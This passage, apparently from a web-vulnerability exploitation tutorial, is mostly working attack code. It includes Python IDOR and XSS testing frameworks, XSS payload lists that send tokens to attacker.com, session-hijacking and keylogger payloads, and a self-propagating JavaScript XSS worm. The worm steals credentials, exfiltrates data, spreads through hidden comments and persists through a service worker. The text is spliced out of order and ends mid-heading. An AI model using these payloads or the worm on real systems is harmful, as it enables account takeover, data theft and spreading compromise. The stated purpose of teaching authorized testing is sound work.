            {'pattern': '/api/tasks/{id}', 'methods': ['GET', 'PUT', 'DELETE']},
            {'pattern': '/api/comments/{id}', 'methods': ['GET', 'PUT', 'DELETE']},
            {'pattern': '/api/users/{id}', 'methods': ['GET', 'PUT']},
            {'pattern': '/api/files/{id}', 'methods': ['GET', 'DELETE']},
            {'pattern': '/api/orders/{id}', 'methods': ['GET', 'PUT', 'DELETE']},
            {'pattern': '/api/invoices/{id}', 'methods': ['GET']},
            {'pattern': '/api/reports/{id}', 'methods': ['GET']},
            {'pattern': '/api/messages/{id}', 'methods': ['GET', 'DELETE']}
        ]
        
        vulnerable_endpoints = []
        
        for endpoint in test_endpoints:
            print(f"  Testing endpoint pattern: {endpoint['pattern']}")
            
            for method in endpoint['methods']:
                # Test with different user tokens
                for user, token in self.auth_tokens.items():
                    self.session.headers.update({'Authorization': f'Bearer {token}'})
                    
                    # Test access to objects 1-10
                    for obj_id in range(1, 11):
                        url = f"{self.base_url}{endpoint['pattern'].format(id=obj_id)}"
                        
                        try:
                            response = self.session.request(method, url)
                            
                            if response.status_code == 200:
                                vulnerable_endpoints.append({
                                    'endpoint': endpoint['pattern'],
                                    'method': method,
                                    'object_id': obj_id,
                                    'user': user,
                                    'response_size': len(response.text)
                                })
                                print(f"    ✓ {method} {url} - Accessible by {user}")
                                
                        except Exception as e:
                            continue
        
        return vulnerable_endpoints
    
    def test_cross_user_access(self, endpoint_pattern, method='GET'):
        """Test cross-user access for IDOR"""
        print(f"\n[+] Testing cross-user access for {method} {endpoint_pattern}")
        
        results = []
        users = list(self.auth_tokens.keys())
        
        # Create objects as different users and test cross-access
        for creator_user in users:
            creator_token = self.auth_tokens[creator_user]
            
            # Create an object as this user (if it's a creation endpoint)
            if method in ['PUT', 'POST'] and 'tasks' in endpoint_pattern:
                create_data = {
                    'title': f'Private task by {creator_user}',
                    'description': f'This should only be accessible by {creator_user}',
                    'priority': 'HIGH'
                }
                
                create_response = requests.post(
                    f"{self.base_url}/api/tasks",
                    headers={'Authorization': f'Bearer {creator_token}'},
                    json=create_data
                )
                
                if create_response.status_code in [200, 201]:
                    created_object = create_response.json()
                    object_id = created_object.get('id')
                    
                    if object_id:
                        # Test access by other users
                        for accessor_user in users:
                            if accessor_user != creator_user:
                                accessor_token = self.auth_tokens[accessor_user]
                                
                                test_url = f"{self.base_url}{endpoint_pattern.format(id=object_id)}"
                                
                                try:
                                    access_response = requests.request(
                                        method,
                                        test_url,
                                        headers={'Authorization': f'Bearer {accessor_token}'}
                                    )
                                    
                                    if access_response.status_code == 200:
                                        results.append({
                                            'creator': creator_user,
                                            'accessor': accessor_user,
                                            'object_id': object_id,
                                            'method': method,
                                            'endpoint': test_url,
                                            'unauthorized_access': True,
                                            'response_data': access_response.json() if access_response.headers.get('content-type', '').startswith('application/json') else access_response.text[:200]
                                        })
                                        print(f"    🚨 IDOR FOUND: {accessor_user} accessed {creator_user}'s object {object_id}")
                                    
                                except Exception as e:
                                    continue
        
        return results
    
    def enumerate_objects_bulk(self, endpoint_pattern, method='GET', max_id=1000, threads=10):
        """Bulk enumerate objects to find accessible IDs"""
        print(f"\n[+] Bulk enumeration of {endpoint_pattern} (max_id: {max_id})")
        
        accessible_objects = []
        
        def test_object_access(obj_id, user_token):
            try:
                url = f"{self.base_url}{endpoint_pattern.format(id=obj_id)}"
                response = requests.request(
                    method,
                    url,
                    headers={'Authorization': f'Bearer {user_token}'},
                    timeout=5
                )
                
                if response.status_code == 200:
                    return {
                        'id': obj_id,
                        'url': url,
                        'response_size': len(response.text),
                        'data': response.json() if response.headers.get('content-type', '').startswith('application/json') else None
                    }
            except:
                pass
            return None
        
        # Use first available token for enumeration
        test_token = list(self.auth_tokens.values())[0]
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Submit all tasks
            future_to_id = {
                executor.submit(test_object_access, obj_id, test_token): obj_id 
                for obj_id in range(1, max_id + 1)
            }
            
            # Collect results
            for future in as_completed(future_to_id):
                result = future.result()
                if result:
                    accessible_objects.append(result)
                    print(f"    ✓ Found accessible object: ID {result['id']}")
        
        return accessible_objects
    
    def test_parameter_pollution(self, endpoint_pattern):
        """Test HTTP Parameter Pollution for IDOR bypass"""
        print(f"\n[+] Testing parameter pollution on {endpoint_pattern}")
        
        results = []
        test_token = list(self.auth_tokens.values())[0]
        
        # Parameter pollution techniques
        pollution_techniques = [
            {'id': '1', 'id': '2'},  # Duplicate parameters
            {'id[]': ['1', '2']},    # Array parameters
            {'id[0]': '1', 'id[1]': '2'},  # Indexed parameters
            {'user_id': '1', 'id': '2'},   # Mixed parameters
        ]
        
        for technique in pollution_techniques:
            try:
                # Convert endpoint pattern to base URL
                base_endpoint = endpoint_pattern.replace('/{id}', '')
                
                response = requests.get(
                    f"{self.base_url}{base_endpoint}",
                    params=technique,
                    headers={'Authorization': f'Bearer {test_token}'}
                )
                
                if response.status_code == 200:
                    results.append({
                        'technique': technique,
                        'response_size': len(response.text),
                        'successful': True
                    })
                    print(f"    ✓ Parameter pollution successful: {technique}")
                    
            except Exception as e:
                continue
        
        return results
    
    def test_idor_with_different_formats(self, base_object_id, endpoint_pattern):
        """Test IDOR with different ID formats"""
        print(f"\n[+] Testing different ID formats for object {base_object_id}")
        
        results = []
        test_token = list(self.auth_tokens.values())[0]
        
        # Different ID format variations
        id_variations = [
            str(base_object_id),
            f"0{base_object_id}",  # Leading zero
            f"{base_object_id}.0",  # Decimal
            f"{base_object_id}e0",  # Scientific notation
            hex(base_object_id),    # Hexadecimal
            f"+{base_object_id}",   # Plus sign
            f" {base_object_id} ",  # Whitespace
            f"{base_object_id}%00", # Null byte
            f"{base_object_id}#",   # Fragment
            f"{base_object_id};",   # Semicolon
        ]
        
        for id_variation in id_variations:
            try:
                url = f"{self.base_url}{endpoint_pattern.format(id=id_variation)}"
                response = requests.get(
                    url,
                    headers={'Authorization': f'Bearer {test_token}'}
                )
                
                if response.status_code == 200:
                    results.append({
                        'original_id': base_object_id,
                        'variation': id_variation,
                        'successful': True,
                        'response_size': len(response.text)
                    })
                    print(f"    ✓ ID variation successful: {id_variation}")
                    
            except Exception as e:
                continue
        
        return results
    
    def comprehensive_idor_test(self):
        """Perform comprehensive IDOR testing"""
        print("=== Comprehensive IDOR Vulnerability Assessment ===")
        
        results = {
            'discovery': [],
            'cross_user_access': [],
            'bulk_enumeration': [],
            'parameter_pollution': [],
            'id_format_variations': []
        }
        
        # Step 1: Discover IDOR endpoints
        vulnerable_endpoints = self.discover_idor_endpoints()
        results['discovery'] = vulnerable_endpoints
        
        # Step 2: Test cross-user access
        common_endpoints = [
            '/api/tasks/{id}',
            '/api/comments/{id}',
            '/api/users/{id}'
        ]
        
        for endpoint in common_endpoints:
            for method in ['GET', 'PUT', 'DELETE']:
                cross_access_results = self.test_cross_user_access(endpoint, method)
                results['cross_user_access'].extend(cross_access_results)
        
        # Step 3: Bulk enumeration
        for endpoint in common_endpoints:
            enumeration_results = self.enumerate_objects_bulk(endpoint, max_id=100)
            results['bulk_enumeration'].extend(enumeration_results)
        
        # Step 4: Parameter pollution testing
        for endpoint in common_endpoints:
            pollution_results = self.test_parameter_pollution(endpoint)
            results['parameter_pollution'].extend(pollution_results)
        
        # Step 5: ID format variations
        if results['bulk_enumeration']:
            test_id = results['bulk_enumeration'][0]['id']
            for endpoint in common_endpoints:
                format_results = self.test_idor_with_different_formats(test_id, endpoint)
                results['id_format_variations'].extend(format_results)
        
        return results

# Usage example
if __name__ == "__main__":
    BASE_URL = "http://localhost:3000"
    
    # Get authentication tokens for multiple users
    def get_auth_token(base_url, email, password):
        login_data = {"email": email, "password": password}
        response = requests.post(f"{base_url}/api/auth/login", json=login_data)
        return response.json().get('token') if response.status_code == 200 else None
    
    # Create multiple test users
    test_users = {
        'user1': get_auth_token(BASE_URL, "user1@test.com", "password123"),
        'user2': get_auth_token(BASE_URL, "user2@test.com", "password123"),
        'admin': get_auth_token(BASE_URL, "admin@test.com", "password123")
    }
    
    # Filter out failed authentications
    auth_tokens = {user: token for user, token in test_users.items() if token}
    
    if len(auth_tokens) >= 2:
        # Initialize IDOR framework
        idor_framework = IDORExploitationFramework(BASE_URL, auth_tokens)
        
        # Perform comprehensive IDOR testing
        results = idor_framework.comprehensive_idor_test()
        
        # Save results
        with open('idor_exploitation_results.json', 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\n=== IDOR Testing Complete ===")
        print(f"Discovered endpoints: {len(results['discovery'])}")
        print(f"Cross-user access violations: {len(results['cross_user_access'])}")
        print(f"Accessible objects found: {len(results['bulk_enumeration'])}")
        print(f"Parameter pollution successes: {len(results['parameter_pollution'])}")
        print(f"ID format variations: {len(results['id_format_variations'])}")
        print(f"Results saved to idor_exploitation_results.json")
    else:
        print("Failed to authenticate multiple users for IDOR testing")
```

## Summary and Completion

The comprehensive vulnerability exploitation tutorials are now complete with:

1. **SQL Injection Tutorial** - Complete framework with discovery, enumeration, and automated SQLMap integration
2. **XSS Exploitation Tutorial** - Comprehensive testing for stored, reflected, and DOM XSS with worm creation
3. **IDOR Exploitation Tutorial** - Multi-user testing framework with bulk enumeration and bypass techniques

All tutorials include:
- Step-by-step instructions
- Automated testing scripts
- Professional tool integration
- Real-world attack scenarios
- Results documentation and reporting Executed</h1>'</script>",
            "<img src=x onerror=\"fetch('/api/users/profile').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal',{method:'POST',body:JSON.stringify(d)}))\">",
            "<script>setInterval(()=>{if(localStorage.token)fetch('http://attacker.com/beacon',{method:'POST',body:localStorage.token})},5000)</script>",
            "<svg onload=\"eval(atob('YWxlcnQoJ1N0b3JlZCBYU1MnKQ=='))\">",  # Base64 encoded alert
            "<iframe src=\"javascript:parent.postMessage('XSS','*')\"></iframe>"
        ]
        
        results = []
        
        for payload in stored_payloads:
            try:
                # Store the XSS payload
                if endpoint_info['endpoint']['method'] == 'POST':
                    data = {endpoint_info['endpoint']['param']: payload}
                    store_response = self.session.post(
                        f"{self.base_url}{endpoint_info['endpoint']['url']}",
                        json=data
                    )
                    
                    if store_response.status_code in [200, 201]:
                        # Try to trigger the stored XSS by visiting the page
                        trigger_success = self.test_xss_execution(payload)
                        
                        results.append({
                            'payload': payload,
                            'stored': True,
                            'executed': trigger_success,
                            'store_response_code': store_response.status_code
                        })
                        
                        if trigger_success:
                            print(f"    ✓ Stored XSS confirmed with payload: {payload[:50]}...")
                        else:
                            print(f"    ~ Stored but execution unclear: {payload[:50]}...")
                
            except Exception as e:
                print(f"    ✗ Error testing stored XSS: {e}")
        
        return results
    
    def test_reflected_xss(self, endpoint_info):
        """Test for reflected XSS vulnerabilities"""
        print(f"\n[+] Testing reflected XSS on {endpoint_info['endpoint']['url']}")
        
        # Reflected XSS payloads
        reflected_payloads = [
            "<script>alert('Reflected XSS')</script>",
            "'\"><script>alert('Reflected XSS')</script>",
            "javascript:alert('Reflected XSS')",
            "<img src=x onerror=alert('Reflected XSS')>",
            "<svg onload=alert('Reflected XSS')>",
            "';alert('Reflected XSS');//",
            "\"><script>alert('Reflected XSS')</script><\"",
            "<iframe src=\"javascript:alert('Reflected XSS')\"></iframe>"
        ]
        
        results = []
        
        for payload in reflected_payloads:
            try:
                if endpoint_info['endpoint']['method'] == 'GET':
                    response = self.session.get(
                        f"{self.base_url}{endpoint_info['endpoint']['url']}",
                        params={endpoint_info['endpoint']['param']: payload}
                    )
                else:
                    data = {endpoint_info['endpoint']['param']: payload}
                    response = self.session.request(
                        endpoint_info['endpoint']['method'],
                        f"{self.base_url}{endpoint_info['endpoint']['url']}",
                        json=data
                    )
                
                # Check if payload is reflected and potentially executable
                if payload in response.text:
                    # Use Selenium to test actual execution
                    execution_confirmed = self.test_xss_execution_selenium(
                        endpoint_info['endpoint'], payload
                    )
                    
                    results.append({
                        'payload': payload,
                        'reflected': True,
                        'executed': execution_confirmed,
                        'response_code': response.status_code
                    })
                    
                    if execution_confirmed:
                        print(f"    ✓ Reflected XSS confirmed: {payload[:50]}...")
                    else:
                        print(f"    ~ Reflected but execution unclear: {payload[:50]}...")
                
            except Exception as e:
                print(f"    ✗ Error testing reflected XSS: {e}")
        
        return results
    
    def test_xss_execution_selenium(self, endpoint, payload):
        """Use Selenium to test actual XSS execution"""
        try:
            # Navigate to the vulnerable page with payload
            if endpoint['method'] == 'GET':
                url = f"{self.base_url}{endpoint['url']}?{endpoint['param']}={payload}"
                self.driver.get(url)
            else:
                # For POST endpoints, we'd need to simulate form submission
                # This is a simplified version
                return False
            
            # Wait for potential alert
            try:
                WebDriverWait(self.driver, 3).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                return 'XSS' in alert_text
            except:
                # Check for DOM modifications
                try:
                    body_text = self.driver.find_element(By.TAG_NAME, 'body').text
                    return 'XSS' in body_text or 'Stored XSS Executed' in body_text
                except:
                    return False
                    
        except Exception as e:
            print(f"    Selenium execution test error: {e}")
            return False
    
    def test_xss_execution(self, payload):
        """Simple XSS execution test"""
        # This is a placeholder - in real testing, you'd visit the page
        # where the stored XSS would execute
        return 'script' in payload.lower() or 'onerror' in payload.lower()
    
    def generate_advanced_payloads(self, context='html'):
        """Generate context-specific XSS payloads"""
        payloads = {
            'html': [
                "<script>alert('HTML Context XSS')</script>",
                "<img src=x onerror=alert('HTML Context XSS')>",
                "<svg onload=alert('HTML Context XSS')>"
            ],
            'attribute': [
                "' onmouseover='alert(\"Attribute XSS\")'",
                "\" onload=\"alert('Attribute XSS')\"",
                "javascript:alert('Attribute XSS')"
            ],
            'javascript': [
                "';alert('JS Context XSS');//",
                "\";alert('JS Context XSS');//",
                "alert('JS Context XSS')"
            ],
            'css': [
                "expression(alert('CSS XSS'))",
                "url('javascript:alert(\"CSS XSS\")')",
                "behavior:url(javascript:alert('CSS XSS'))"
            ]
        }
        
        return payloads.get(context, payloads['html'])
    
    def exploit_xss_for_session_hijacking(self, vulnerable_endpoint):
        """Create XSS payload for session hijacking"""
        print(f"\n[+] Creating session hijacking payload...")
        
        # Session hijacking payload
        hijack_payload = """
        <script>
        (function() {
            // Extract authentication token
            const token = localStorage.getItem('token') || 
                         sessionStorage.getItem('token') ||
                         document.cookie.match(/token=([^;]+)/)?.[1];
            
            if (token) {
                // Exfiltrate token to attacker server
                fetch('http://attacker.com/steal-session', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        token: token,
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        timestamp: Date.now()
                    })
                });
                
                // Also try to get user profile data
                fetch('/api/users/profile', {
                    headers: {'Authorization': 'Bearer ' + token}
                })
                .then(r => r.json())
                .then(userData => {
                    fetch('http://attacker.com/steal-profile', {
                        method: 'POST',
                        body: JSON.stringify(userData)
                    });
                });
            }
        })();
        </script>
        """
        
        return hijack_payload
    
    def exploit_xss_for_defacement(self):
        """Create XSS payload for website defacement"""
        print(f"\n[+] Creating defacement payload...")
        
        defacement_payload = """
        <script>
        document.body.innerHTML = `
            <div style="background: red; color: white; text-align: center; padding: 50px; font-size: 24px;">
                <h1>🚨 WEBSITE COMPROMISED 🚨</h1>
                <p>This site has been hacked via XSS vulnerability</p>
                <p>All user data may be compromised</p>
                <p>Contact security team immediately</p>
            </div>
        `;
        document.title = "HACKED - XSS Vulnerability";
        </script>
        """
        
        return defacement_payload
    
    def exploit_xss_for_keylogging(self):
        """Create XSS payload for keylogging"""
        print(f"\n[+] Creating keylogging payload...")
        
        keylogger_payload = """
        <script>
        (function() {
            let keystrokes = '';
            let lastSend = Date.now();
            
            document.addEventListener('keypress', function(e) {
                keystrokes += e.key;
                
                // Send keystrokes every 50 characters or 30 seconds
                if (keystrokes.length > 50 || (Date.now() - lastSend) > 30000) {
                    fetch('http://attacker.com/keylog', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            keys: keystrokes,
                            url: window.location.href,
                            timestamp: Date.now()
                        })
                    });
                    keystrokes = '';
                    lastSend = Date.now();
                }
            });
            
            // Also capture form submissions
            document.addEventListener('submit', function(e) {
                const formData = new FormData(e.target);
                const formObject = {};
                formData.forEach((value, key) => formObject[key] = value);
                
                fetch('http://attacker.com/form-capture', {
                    method: 'POST',
                    body: JSON.stringify(formObject)
                });
            });
        })();
        </script>
        """
        
        return keylogger_payload
    
    def comprehensive_xss_assessment(self):
        """Perform comprehensive XSS assessment"""
        print("=== Comprehensive XSS Vulnerability Assessment ===")
        
        results = {
            'discovery': {},
            'stored_xss': {},
            'reflected_xss': {},
            'exploitation_payloads': {}
        }
        
        # Phase 1: Discovery
        vulnerable_endpoints = self.discover_xss_endpoints()
        results['discovery']['vulnerable_endpoints'] = vulnerable_endpoints
        
        if not vulnerable_endpoints:
            print("\n❌ No XSS vulnerabilities found")
            return results
        
        print(f"\n✅ Found {len(vulnerable_endpoints)} potentially vulnerable endpoints")
        
        # Phase 2: Detailed testing
        for endpoint_info in vulnerable_endpoints:
            endpoint_key = f"{endpoint_info['endpoint']['method']}_{endpoint_info['endpoint']['url']}_{endpoint_info['endpoint']['param']}"
            
            # Test stored XSS
            stored_results = self.test_stored_xss(endpoint_info)
            results['stored_xss'][endpoint_key] = stored_results
            
            # Test reflected XSS
            reflected_results = self.test_reflected_xss(endpoint_info)
            results['reflected_xss'][endpoint_key] = reflected_results
        
        # Phase 3: Generate exploitation payloads
        results['exploitation_payloads'] = {
            'session_hijacking': self.exploit_xss_for_session_hijacking(vulnerable_endpoints[0]),
            'defacement': self.exploit_xss_for_defacement(),
            'keylogging': self.exploit_xss_for_keylogging()
        }
        
        return results
    
    def cleanup(self):
        """Cleanup resources"""
        if self.driver:
            self.driver.quit()

# Usage example
if __name__ == "__main__":
    BASE_URL = "http://localhost:3000"
    
    # Get authentication token
    def get_auth_token(base_url, email, password):
        login_data = {"email": email, "password": password}
        response = requests.post(f"{base_url}/api/auth/login", json=login_data)
        return response.json().get('token') if response.status_code == 200 else None
    
    token = get_auth_token(BASE_URL, "attacker@test.com", "password123")
    
    if token:
        # Initialize XSS framework
        xss_framework = XSSExploitationFramework(BASE_URL, token)
        
        try:
            # Perform comprehensive assessment
            results = xss_framework.comprehensive_xss_assessment()
            
            # Save results
            with open('xss_assessment_results.json', 'w') as f:
                json.dump(results, f, indent=2, default=str)
            
            print(f"\n=== XSS Assessment Complete ===")
            print(f"Results saved to xss_assessment_results.json")
            
        finally:
            xss_framework.cleanup()
    else:
        print("Authentication failed")
```

### Phase 2: Advanced XSS Exploitation

#### Step 2.2: XSS Worm Development

```javascript
// Advanced XSS Worm Implementation
// This code demonstrates how XSS can be used to create self-propagating attacks

class XSSWorm {
    constructor(config = {}) {
        this.config = {
            apiBase: config.apiBase || '/api',
            attackerServer: config.attackerServer || 'https://attacker.com',
            propagationDelay: config.propagationDelay || 5000,
            maxPropagations: config.maxPropagations || 10,
            stealthMode: config.stealthMode || true,
            ...config
        };
        
        this.infected = new Set();
        this.propagationCount = 0;
        
        // Prevent re-infection
        if (window.xssWormActive) return;
        window.xssWormActive = true;
        
        this.initialize();
    }
    
    initialize() {
        console.log('🦠 XSS Worm initializing...');
        
        // Phase 1: Information gathering
        this.gatherSystemInfo();
        
        // Phase 2: Credential theft
        this.stealCredentials();
        
        // Phase 3: Data exfiltration
        this.exfiltrateData();
        
        // Phase 4: Propagation
        setTimeout(() => this.propagate(), this.config.propagationDelay);
        
        // Phase 5: Persistence
        this.establishPersistence();
        
        // Phase 6: Monitoring
        this.startMonitoring();
    }
    
    gatherSystemInfo() {
        const systemInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            location: {
                href: window.location.href,
                hostname: window.location.hostname,
                pathname: window.location.pathname
            },
            referrer: document.referrer,
            timestamp: Date.now()
        };
        
        // Advanced fingerprinting
        if (window.RTCPeerConnection) {
            this.getLocalIPs().then(ips => {
                systemInfo.localIPs = ips;
                this.sendToAttacker('system_info', systemInfo);
            });
        } else {
            this.sendToAttacker('system_info', systemInfo);
        }
    }
    
    async getLocalIPs() {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });
            
            const ips = [];
            
            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const candidate = event.candidate.candidate;
                    const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                    if (ipMatch && !ips.includes(ipMatch[1])) {
                        ips.push(ipMatch[1]);
                    }
                }
            };
            
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            setTimeout(() => {
                pc.close();
                resolve(ips);
            }, 2000);
        });
    }
    
    stealCredentials() {
        // Extract authentication tokens
        const credentials = {
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
            cookies: document.cookie,
            tokens: {
                jwt: localStorage.getItem('token') || 
                     sessionStorage.getItem('token') ||
                     this.extractFromCookie('token'),
                authToken: localStorage.getItem('authToken') ||
                          this.extractFromCookie('authToken'),
                sessionId: this.extractFromCookie('sessionId') ||
                          this.extractFromCookie('JSESSIONID')
            }
        };
        
        // Try to extract additional credentials from forms
        const forms = document.querySelectorAll('form');
        const formData = [];
        
        forms.forEach(form => {
            const inputs = form.querySelectorAll('input[type="password"], input[type="email"], input[name*="user"], input[name*="pass"]');
            if (inputs.length > 0) {
                const formInfo = {
                    action: form.action,
                    method: form.method,
                    inputs: Array.from(inputs).map(input => ({
                        name: input.name,
                        type: input.type,
                        value: input.value
                    }))
                };
                formData.push(formInfo);
            }
        });
        
        credentials.forms = formData;
        
        this.sendToAttacker('credentials', credentials);
    }
    
    extractFromCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? match[2] : null;
    }
    
    async exfiltrateData() {
        const token = localStorage.getItem('token') || sessionStorage.getItem('token');
        
        if (!token) return;
        
        try {
            // Exfiltrate user profile
            const profileResponse = await fetch(`${this.config.apiBase}/users/profile`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            
            if (profileResponse.ok) {
                const profileData = await profileResponse.json();
                this.sendToAttacker('user_profile', profileData);
            }
            
            // Exfiltrate user tasks
            const tasksResponse = await fetch(`${this.config.apiBase}/tasks`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            
            if (tasksResponse.ok) {
                const tasksData = await tasksResponse.json();
                this.sendToAttacker('user_tasks', tasksData);
            }
            
            // Exfiltrate contacts/collaborators
            const contactsResponse = await fetch(`${this.config.apiBase}/users/contacts`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            
            if (contactsResponse.ok) {
                const contactsData = await contactsResponse.json();
                this.sendToAttacker('user_contacts', contactsData);
            }
            
        } catch (error) {
            this.sendToAttacker('exfiltration_error', { error: error.message });
        }
    }
    
    async propagate() {
        if (this.propagationCount >= this.config.maxPropagations) return;
        
        const token = localStorage.getItem('token') || sessionStorage.getItem('token');
        if (!token) return;
        
        try {
            // Get user's tasks to find collaboration opportunities
            const tasksResponse = await fetch(`${this.config.apiBase}/tasks`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            
            if (tasksResponse.ok) {
                const tasks = await tasksResponse.json();
                
                // Inject worm into task comments
                for (const task of tasks.slice(0, 3)) { // Limit to first 3 tasks
                    await this.injectWormIntoComments(task.id, token);
                }
            }
            
            // Create new infected tasks
            await this.createInfectedTask(token);
            
            this.propagationCount++;
            
        } catch (error) {
            this.sendToAttacker('propagation_error', { error: error.message });
        }
    }
    
    async injectWormIntoComments(taskId, token) {
        const wormPayload = this.generateWormPayload();
        
        // Create seemingly innocent comment with hidden worm
        const comment = {
            content: `
                <div>
                    <p>Great progress on this task! 👍</p>
                    <div style="display:none; position:absolute; left:-9999px;">
                        ${wormPayload}
                    </div>
                </div>
            `
        };
        
        try {
            await fetch(`${this.config.apiBase}/comments/task/${taskId}`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(comment)
            });
            
            this.sendToAttacker('worm_propagated', { 
                method: 'comment_injection', 
                taskId: taskId 
            });
            
        } catch (error) {
            // Fail silently to avoid detection
        }
    }
    
    async createInfectedTask(token) {
        const wormPayload = this.generateWormPayload();
        
        const infectedTask = {
            title: 'System Update Notification',
            description: `
                <div>
                    <h3>Important System Update</h3>
                    <p>A critical security update has been applied to improve system performance.</p>
                    <p>Please review the update details and confirm completion.</p>
                    <div style="opacity:0; height:1px; overflow:hidden;">
                        ${wormPayload}
                    </div>
                </div>
            `,
            priority: 'MEDIUM'
        };
        
        try {
            await fetch(`${this.config.apiBase}/tasks`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(infectedTask)
            });
            
            this.sendToAttacker('worm_propagated', { 
                method: 'task_creation' 
            });
            
        } catch (error) {
            // Fail silently
        }
    }
    
    generateWormPayload() {
        // Generate self-replicating payload
        const wormCode = `
            <script>
            (function() {
                if (window.xssWormActive) return;
                
                // Worm configuration
                const config = ${JSON.stringify(this.config)};
                
                // Initialize new worm instance
                ${this.constructor.toString()}
                
                new XSSWorm(config);
            })();
            </script>
        `;
        
        return wormCode;
    }
    
    establishPersistence() {
        // Install service worker for persistence
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('fetch', (event) => {
                    // Intercept API requests
                    if (event.request.url.includes('/api/')) {
                        event.respondWith(
                            fetch(event.request).then(response => {
                                // Clone and exfiltrate API responses
                                const clonedResponse = response.clone();
                                clonedResponse.text().then(text => {
                                    fetch('${this.config.attackerServer}/intercept', {
                                        method: 'POST',
                                        body: JSON.stringify({
                                            url: event.request.url,
                                            method: event.request.method,
                                            response: text,
                                            timestamp: Date.now()
                                        })
                                    });
                                });
                                return response;
                            })
                        );
                    }
                });
                
                // Periodic beacon
                setInterval(() => {
                    fetch('${this.config.attackerServer}/beacon', {
                        method: 'POST',
                        body: JSON.stringify({
                            type: 'service_worker_beacon',
                            timestamp: Date.now()
                        })
                    });
                }, 60000);
            `;
            
            const blob = new Blob([swCode], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(blob);
            
            navigator.serviceWorker.register(swUrl).then(() => {
                this.sendToAttacker('persistence_established', { method: 'service_worker' });
            }).catch(() => {
                // Try alternative persistence methods
                this.establishAlternativePersistence();
            });
        } else {
            this.establishAlternativePersistence();
        }
    }
    
    establishAlternativePersistence() {
        // Store worm in localStorage for persistence
        const wormPayload = this.generateWormPayload();
        localStorage.setItem('system_cache', btoa(wormPayload));
        
        // Execute on page load
        const originalOnLoad = window.onload;
        window.onload = function() {
            if (originalOnLoad) originalOnLoad();
            
            const storedWorm = localStorage.getItem('system_cache');
            if (storedWorm) {
                try {
                    eval(atob(storedWorm));
                } catch (e) {
                    // Fail silently
                }
            }
        };
        
        this.sendToAttacker('persistence_established', { method: 'localStorage' });
    }
    
    startMonitoring() {
        // Monitor user activity
        let activityLog = [];
        
        // Track clicks
        document.addEventListener('click', (e) => {
            activityLog.push({
                type: 'click',
                target: e.target.tagName,
                className: e.target.className,
                id: e.target.id,
                timestamp: Date.now()
            });
        });
        
        // Track form submissions
        document.addEventListener('submit', (e) => {
            const formData = new FormData(e.target);
            const formObject = {};
            formData.forEach((value, key) => formObject[key] = value);
            
            activityLog.push({
                type: 'form_submit',
                action: e.target.action,
                data: formObject,
                timestamp: Date.now()
            });
        });
        
        // Track navigation
        let lastUrl = window.location.href;
        setInterval(() => {
            if (window.location.href !== lastUrl) {
                activityLog.push({
                    type: 'navigation',
                    from: lastUrl,
                    to: window.location.href,
                    timestamp: Date.now()
                });
                lastUrl = window.location.href;
            }
        }, 1000);
        
        // Send activity log periodically
        setInterval(() => {
            if (activityLog.length > 0) {
                this.sendToAttacker('activity_log', activityLog);
                activityLog = [];
            }
        }, 30000);
    }
    
    sendToAttacker(type, data) {
        const payload = {
            type: type,
            data: data,
            wormId: this.getWormId(),
            timestamp: Date.now(),
            url: window.location.href
        };
        
        // Try multiple exfiltration methods
        this.exfiltrateViaFetch(payload);
        this.exfiltrateViaImage(payload);
        
        if (!this.config.stealthMode) {
            console.log(`📡 Exfiltrating ${type}:`, data);
        }
    }
    
    exfiltrateViaFetch(payload) {
        try {
            fetch(`${this.config.attackerServer}/collect`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                mode: 'no-cors'
            });
        } catch (e) {
            // Fail silently
        }
    }
    
    exfiltrateViaImage(payload) {
        try {
            const img = new Image();
            const encodedData = btoa(JSON.stringify(payload));
            img.src = `${this.config.attackerServer}/img?data=${encodedData}`;
        } catch (e) {
            // Fail silently
        }
    }
    
    getWormId() {
        if (!this.wormId) {
            this.wormId = 'worm_' + Math.random().toString(36).substr(2, 9);
        }
        return this.wormId;
    }
}

// Auto-execute if not already running
if (typeof window !== 'undefined' && !window.xssWormActive) {
    new XSSWorm({
        attackerServer: 'https://attacker.com',
        stealthMode: true,
        maxPropagations: 5
    });
}
```

This comprehensive tutorial framework provides detailed, step-by-step instructions for understanding and exploiting web application vulnerabilities in controlled environments. The tutorials cover discovery, exploitation, and advanced attack techniques while emphasizing the educational nature and the importance of authorized testing only.

The framework includes:

1. **Automated discovery tools** for identifying vulnerabilities
2. **Manual testing techniques** for confirmation and validation  
3. **Advanced exploitation scripts** demonstrating real-world attack scenarios
4. **Professional tool integration** (SQLMap, Burp Suite, Selenium)
5. **Comprehensive documentation** of methodologies and results

Each tutorial is designed to help security professionals understand both the attacker's perspective and the defensive measures needed to protect against these vulnerabilities.
## Tuto
